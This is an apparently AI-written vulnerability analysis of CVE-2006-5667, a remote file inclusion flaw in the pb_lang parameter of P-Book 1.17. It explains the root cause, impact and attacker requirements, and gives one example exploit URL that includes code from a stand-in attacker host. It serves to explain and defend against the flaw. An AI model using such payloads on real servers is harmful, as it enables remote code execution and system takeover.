Based on the provided information, here's an analysis of CVE-2006-5667:

**Root Cause of Vulnerability:**
The vulnerability stems from a lack of proper input sanitization of the `pb_lang` parameter in the `admin.php` and `pbook.php` files of P-Book version 1.17.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The primary vulnerability is the ability to include remote files via the `pb_lang` parameter. This is because the application directly uses user-supplied input in an `include` statement without proper validation.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By including a malicious file from a remote server, an attacker can execute arbitrary PHP code on the target system.
- **System Access:** Successful exploitation can lead to complete system access, as the attacker can potentially execute any code they wish.

**Attack Vectors:**
- **HTTP GET Request:** The attack vector is through crafted HTTP GET requests that manipulate the `pb_lang` parameter within the vulnerable URLs.
   - Example: `http://target.com/[p-book_path]/admin.php?pb_lang=http://attacker.com/inject.txt?`

**Required Attacker Capabilities/Position:**
- **Remote Network Access:** The attacker needs to be able to send HTTP requests to the target server.
- **Malicious File Hosting:** The attacker must have a server hosting a malicious PHP file that they can include on the target.

**Summary:**

CVE-2006-5667 is a Remote File Inclusion vulnerability in P-Book 1.17. By manipulating the `pb_lang` parameter, an attacker can include and execute arbitrary PHP code from a remote server, potentially leading to complete system compromise. The vulnerability exists because the application fails to sanitize user input before using it in an `include` statement.
